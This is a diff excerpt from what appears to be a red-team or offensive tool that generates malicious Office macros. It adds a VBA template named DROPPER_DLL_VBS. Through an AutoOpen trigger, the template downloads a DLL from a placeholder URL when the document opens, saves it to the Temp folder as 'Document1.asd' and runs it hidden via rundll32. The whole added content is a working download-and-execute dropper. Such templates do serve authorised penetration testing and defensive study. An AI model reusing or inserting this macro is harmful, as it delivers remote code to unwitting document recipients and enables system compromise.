@@ -210,6 +210,37 @@ Sub Invoke()
 End Sub
 """
 
+DROPPER_DLL_VBS = \
+r"""
+Sub AutoOpen()
+    DropRunDll
+End Sub
+
+Private Sub DropRunDll()
+    'Download DLL
+    Dim dll_URL As String
+    dll_URL = "<<<DLL_URL>>>"
+
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    WinHttpReq.Open "GET", dll_URL, False
+    WinHttpReq.send
+
+    myURL = WinHttpReq.responseBody
+    If WinHttpReq.Status = 200 Then
+        Set oStream = CreateObject("ADODB.Stream")
+        oStream.Open
+        oStream.Type = 1
+        oStream.Write WinHttpReq.responseBody
+        oStream.SaveToFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\Document1.asd", 2
+        oStream.Close
+        ' Call dll using rundll32
+        CreateObject("WScript.Shell").Run "%windir%\system32\rundll32.exe %temp%\Document1.asd,<<<DLL_FUNCTION>>>", 0
+    End If
+End Sub
+
+"""
+
 
 EMBED_DLL_VBS = \
 r"""
